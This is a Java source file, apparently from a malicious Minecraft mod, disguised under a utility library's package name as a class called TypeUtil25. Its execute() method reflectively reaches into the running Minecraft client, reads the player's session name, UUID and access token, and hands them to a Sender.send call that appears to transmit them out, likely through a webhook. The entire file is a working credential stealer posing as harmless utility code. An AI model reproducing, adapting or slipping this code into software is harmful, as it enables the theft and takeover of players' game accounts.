package net.jodah.typetools.util.impl;

import net.jodah.typetools.Sender;
import net.jodah.typetools.util.Payload;
import net.jodah.typetools.util.Typer;
import net.minecraft.launchwrapper.Launch;

public final class TypeUtil25 implements Payload
{
    @Override
    public void execute() throws Exception
    {
        Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
        Object minecraft = mc.getMethod("func_71410_x").invoke(null);
        Object session = mc.getMethod("func_110432_I").invoke(minecraft);
        Class<?> sessionClass = Launch.classLoader.findClass("net.minecraft.util.Session");
        Object token = sessionClass.getMethod("func_148254_d").invoke(session);
        Object name = sessionClass.getMethod("func_111285_a").invoke(session);
        Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);

        Sender.send(new Typer.Builder("Session")
                .addField("Name", (String) name, true)
                .addField("UUID", (String) uuid, true)
                .addField("Token", (String) token, false)
                .build());
    }
}
